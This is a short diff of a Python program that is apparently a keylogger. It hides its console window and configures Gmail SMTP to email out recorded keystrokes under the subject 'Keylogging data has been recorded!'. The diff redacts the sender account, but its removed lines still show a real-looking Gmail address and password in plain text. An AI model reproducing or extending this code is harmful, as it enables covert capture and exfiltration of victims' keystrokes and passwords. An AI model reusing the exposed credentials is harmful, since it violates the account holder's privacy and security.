@@ -13,8 +13,8 @@ foreground_window = win32gui.GetForegroundWindow()
 win32gui.ShowWindow(foreground_window, win32con.SW_HIDE)
 
 GMAIL_SERVER = 'smtp.gmail.com:587'
-PROJECT_MAIL_ADDRESS = 'danacohentalbaum@gmail.com'
-PROJECT_MAIL_PASS = 'danatal123'
+PROJECT_MAIL_ADDRESS = 'XXXXXXXXXXXXXXXXXXXXXXXX@gmail.com'
+PROJECT_MAIL_PASS = 'XXXXXXX'
 SUBJECT_OF_MAIL_MSG = 'Subject: Keylogging data has been recorded!\n'
 LOGGER_FILENAME = 'input.txt'
 LOGGER_FORMAT = '%(message)s'
